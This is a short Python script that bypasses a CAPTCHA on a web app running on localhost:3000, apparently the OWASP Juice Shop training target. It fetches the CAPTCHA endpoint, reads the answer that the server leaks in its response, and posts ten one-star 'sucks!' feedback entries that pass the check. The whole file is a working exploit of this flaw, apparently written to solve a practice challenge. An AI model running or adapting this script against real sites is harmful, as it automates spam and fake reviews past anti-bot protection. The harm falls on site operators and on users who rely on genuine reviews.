import requests
import json

class CAPTCHA_Bypass():
	for x in range(0,10):

		# GET captcha id and answer
		r = requests.get("http://localhost:3000/rest/captcha/")
		data = r.json()

		captcha_id = data['captchaId']
		captcha_answer = data['answer']

		# POST form 

		# Create form parameters
		# sample parameters {"captchaId":11,"captcha":"17","comment":"asdasd","rating":5}
		json_obj = {"captchaId":captcha_id,"captcha":captcha_answer,"comment":"sucks!","rating":1}

		headers = {
		'Content-type':'application/json', 
		'Accept':'application/json' }
		result = requests.post("http://localhost:3000/api/Feedbacks", data=json.dumps(json_obj), headers=headers)
		print(result)
		print(result.status_code)
		#print(result.json())